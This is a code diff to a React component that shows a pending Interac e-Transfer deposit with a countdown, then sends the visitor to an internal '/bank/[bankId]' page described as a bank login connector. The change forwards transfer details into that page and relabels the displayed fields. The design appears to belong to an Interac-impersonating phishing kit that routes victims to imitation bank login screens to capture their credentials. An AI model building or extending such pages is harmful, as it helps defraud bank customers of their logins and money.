@@ -60,24 +60,24 @@ export default function CountdownRedirectScreen({ data, transferData }: Countdow
     return () => clearInterval(interval)
   }, [transferData?.timestamp, data.meta.timestamp])
 
-  // Build the bank login redirect URL using bankId from query params
+  // Build the bank login redirect URL
+  // Prefer /bank/[bankId] (internal connector screen) with transfer params forwarded.
+  // Fall back to the bank's direct loginUrl from bankVisuals if bankId is missing.
   const getBankRedirectUrl = () => {
     const params = new URLSearchParams(typeof window !== "undefined" ? window.location.search : "")
     const bankId = params.get("bankId")
     if (bankId) {
-      // Route to /bank/[bankId] which shows the bank login connector screen
       const fwdParams = new URLSearchParams({
-        transferId:    data.meta.id,
-        amount:        String(data.deposit.amount),
-        recipient:     data.payee.email,
-        recipientName: data.payee.name,
-        bankName:      data.sender.bankName,
-        message:       data.deposit.memo || "",
-        timestamp:     data.meta.timestamp,
+        transferId:    transferData?.transferId    || data.meta.id,
+        amount:        transferData?.amount        || String(data.deposit.amount),
+        recipient:     transferData?.recipient     || data.payee.email,
+        recipientName: transferData?.recipientName || data.payee.name,
+        senderBank:    transferData?.senderBank    || data.sender.bankName,
+        message:       transferData?.message       || data.deposit.memo || "",
+        timestamp:     transferData?.timestamp     || data.meta.timestamp,
       })
       return `/bank/${bankId}?${fwdParams.toString()}`
     }
-    // Fallback: direct to bank login URL if bankId is unavailable
     return data.bankVisuals.login || "https://www.interac.ca"
   }
 
@@ -167,39 +167,51 @@ export default function CountdownRedirectScreen({ data, transferData }: Countdow
               <div className="space-y-1">
                 <p className="text-sm text-zinc-500">Amount</p>
                 <p className="text-xl font-bold text-white">
-                  ${data.deposit.amount.toFixed(2)} {data.deposit.currency}
+                  ${transferData
+                    ? parseFloat(transferData.amount).toFixed(2)
+                    : data.deposit.amount.toFixed(2)
+                  } {data.deposit.currency}
                 </p>
               </div>
 
               <div className="space-y-1">
                 <p className="text-sm text-zinc-500">Reference</p>
-                <p className="text-base font-mono text-white">{data.deposit.reference}</p>
-              </div>
-
-              <div className="space-y-1">
-                <p className="text-sm text-zinc-500">Payee</p>
-                <p className="text-base text-white">{data.payee.name}</p>
-                <p className="text-sm text-zinc-400">{data.payee.email}</p>
-              </div>
-
-              <div className="space-y-1">
-                <p className="text-sm text-zinc-500">Bank</p>
-                <p className="text-base text-white">{data.sender.bankName}</p>
-                <p className="text-sm text-zinc-400">
-                  {data.sender.institution}-{data.sender.branch}
+                <p className="text-base font-mono text-white">
+                  {transferData?.transferId || data.deposit.reference}
                 </p>
               </div>
 
-              {data.deposit.memo && (
+              <div className="space-y-1">
+                <p className="text-sm text-zinc-500">Recipient</p>
+                <p className="text-base text-white">
+                  {transferData?.recipientName || data.payee.name}
+                </p>
+                <p className="text-sm text-zinc-400">
+                  {transferData?.recipient || data.payee.email}
+                </p>
+              </div>
+
+              <div className="space-y-1">
+                <p className="text-sm text-zinc-500">From</p>
+                <p className="text-base text-white">
+                  {transferData?.senderBank || data.sender.bankName}
+                </p>
+              </div>
+
+              {(transferData?.message || data.deposit.memo) && (
                 <div className="space-y-1 md:col-span-2">
-                  <p className="text-sm text-zinc-500">Memo</p>
-                  <p className="text-base text-white">{data.deposit.memo}</p>
+                  <p className="text-sm text-zinc-500">Message</p>
+                  <p className="text-base text-white">
+                    {transferData?.message || data.deposit.memo}
+                  </p>
                 </div>
               )}
 
               <div className="space-y-1 md:col-span-2">
                 <p className="text-sm text-zinc-500">Transaction ID</p>
-                <p className="text-sm font-mono text-zinc-400">{data.meta.id}</p>
+                <p className="text-sm font-mono text-zinc-400">
+                  {transferData?.transferId || data.meta.id}
+                </p>
               </div>
             </div>
           </div>
